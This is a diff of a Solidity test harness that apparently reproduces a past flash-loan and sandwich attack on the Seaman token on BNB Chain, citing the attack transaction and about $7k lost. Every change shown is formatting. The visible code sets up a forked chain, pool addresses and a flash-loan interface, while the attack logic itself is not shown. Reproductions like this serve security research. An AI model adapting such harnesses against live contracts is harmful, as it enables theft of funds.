@@ -15,7 +15,7 @@ The attacker managed to manipulate a pair and sandwiching the token contract inv
 transfers.
 
 // Attack Overview
-Total Lost: ~$7k 
+Total Lost: ~$7k
 Attack Tx: https://bscscan.com/tx/0x6f1af27d08b10caa7e96ec3d580bf39e29fd5ece00abda7d8955715403bf34a8
 Ethereum Transaction Viewer:
 https://tx.eth.samczsun.com/binance/0x6f1af27d08b10caa7e96ec3d580bf39e29fd5ece00abda7d8955715403bf34a8
@@ -75,8 +75,7 @@ MITIGATIONS:
 interface ISeaman is IERC20 {}
 
 interface IDppOracle {
-    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes memory data)
-        external;
+    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes memory data) external;
 }
 
 contract Exploit_Seaman is TestHarness, TokenBalanceTracker {
@@ -85,12 +84,13 @@ contract Exploit_Seaman is TestHarness, TokenBalanceTracker {
     IERC20 internal usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
 
     address internal pairUsdtSeaman = 0x6637914482670f91F43025802b6755F27050b0a6;
-    IUniswapV2Router02 internal pancakeRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router02 internal pancakeRouter =
+        IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 
     IDppOracle internal dppOracle = IDppOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
 
     function setUp() external {
-        cheat.createSelectFork(vm.envString("RPC_URL"), 23467515);
+        cheat.createSelectFork(vm.envString("RPC_URL"), 23_467_515);
         cheat.deal(address(this), 0);
 
         addTokenToTracker(address(usdt));
